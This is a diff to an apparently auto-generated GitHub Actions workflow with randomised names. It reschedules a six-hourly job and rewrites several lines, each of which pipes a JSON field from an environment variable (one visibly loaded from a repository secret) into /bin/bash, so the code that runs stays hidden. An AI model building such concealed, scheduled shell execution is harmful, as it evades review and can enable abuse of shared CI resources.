@@ -2,7 +2,7 @@ name: yutongvvg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +10,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: yutongvvg
         env:
-          ya376: ${{ secrets.ya376 }}
+          c76: ${{ secrets.c76 }}
         run: |
-          echo $ya376 | jq -r .wvid9 | /bin/bash
-          echo $f07 | jq -r .yads94 | /bin/bash
-          echo $xnwo205 | jq -r .iic00690 | /bin/bash
-          echo $ukjhz13 | jq -r .xfn1 | /bin/bash
-          echo $mifr2 | jq -r .dfuxf05937 | /bin/bash
-          echo $kjb39507 | jq -r .styte05 | /bin/bash
-          echo $dttbr891 | jq -r .vpx4378 | /bin/bash
-          echo $npn7831 | jq -r .wc04 | /bin/bash
+          echo $c76 | jq -r .msiz39 | /bin/bash
+          echo $ug07213 | jq -r .nbh18 | /bin/bash
+          echo $xmkdy7355 | jq -r .mz5 | /bin/bash
+          echo $x0322 | jq -r .xdd3 | /bin/bash
+          echo $aiff1010 | jq -r .efou92 | /bin/bash
+          echo $ma876 | jq -r .ee4151 | /bin/bash
 
